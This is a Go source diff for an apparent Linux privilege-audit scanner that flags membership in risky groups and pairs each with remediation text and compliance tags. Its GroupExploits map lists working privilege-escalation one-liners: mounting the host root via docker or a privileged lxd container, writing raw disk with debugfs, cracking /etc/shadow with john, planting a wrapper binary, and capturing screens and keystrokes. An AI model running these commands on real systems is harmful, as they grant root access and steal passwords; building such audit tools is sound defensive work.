@@ -2,6 +2,7 @@ package scanners
 
 import (
 	"os/user"
+	"strconv"
 )
 
 type GroupResult struct {
@@ -29,31 +30,29 @@ var PrivilegedGroups = map[string]string{
 	"input":  "Can read raw input events from /dev/input/* for keylogging.",
 }
 
+// GroupExploits maps dangerous groups to actionable GTFOBins or operational exploit hints
 var GroupExploits = map[string]string{
-	"docker": "docker run -v /:/mnt --rm -it alpine chroot /mnt",
-	"lxd":    "lxc image import alpine.tar.gz --alias alpine; lxc init alpine privesc -c security.privileged=true; lxc config device add privesc hostroot disk source=/ path=/mnt/root; lxc start privesc; lxc exec privesc /bin/sh",
-	"disk":   "debugfs /dev/sda1 (or relevant device) - find sensitive files or write to disk.",
-	"shadow": "cat /etc/shadow | grep root",
-	"video":  "cat /dev/fb0 > screenshot.raw; or use tools like fbtft to capture screen.",
-	"input":  "cat /dev/input/event* (requires root or CAP_INPUT) or use showkey to log keys.",
+	"docker": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+	"lxd":    "lxc init ubuntu:22.04 priv -c security.privileged=true && lxc config device add priv host-root disk source=/ path=/mnt/root recursive=true && lxc start priv && lxc exec priv /bin/sh",
+	"lxc":    "lxc-start -n container_name -F /bin/sh",
+	"disk":   "debugfs -w /dev/sda1 (or inspect/modify raw ext4 filesystem data)",
+	"shadow": "john --wordlist=/usr/share/wordlists/rockyou.txt /etc/shadow",
+	"staff":  "Plant wrapper script in /usr/local/bin shadowing standard system binary",
+	"video":  "cat /dev/fb0 > /tmp/screen.raw (or ffmpeg -f fbdev -i /dev/fb0 /tmp/screen.mp4)",
+	"input":  "evtest /dev/input/eventX (capture keyboard keystrokes including passwords)",
 }
 
 // ScanGroups checks if the current user belongs to any high-risk groups
 func ScanGroups() ([]GroupResult, error) {
 	var results []GroupResult
 
-	currentUser, err := user.Current()
-	if err != nil {
-		return results, err
+	userCtx := GetUserContext()
+	if userCtx == nil {
+		return results, nil
 	}
 
-	groupIds, err := currentUser.GroupIds()
-	if err != nil {
-		return results, err
-	}
-
-	for _, gid := range groupIds {
-		group, err := user.LookupGroupId(gid)
+	for gid := range userCtx.GIDs {
+		group, err := user.LookupGroupId(strconv.Itoa(gid))
 		if err != nil {
 			continue
 		}
@@ -70,7 +69,7 @@ func ScanGroups() ([]GroupResult, error) {
 			if hint, ok := GroupExploits[group.Name]; ok {
 				exploitHint = hint
 			}
-			remediation = "gpasswd -d " + currentUser.Username + " " + group.Name
+			remediation = "gpasswd -d " + userCtx.Username + " " + group.Name
 			complianceTag = "CIS-Linux-5.4.1 / NIST-AC-6(2)"
 		}
 
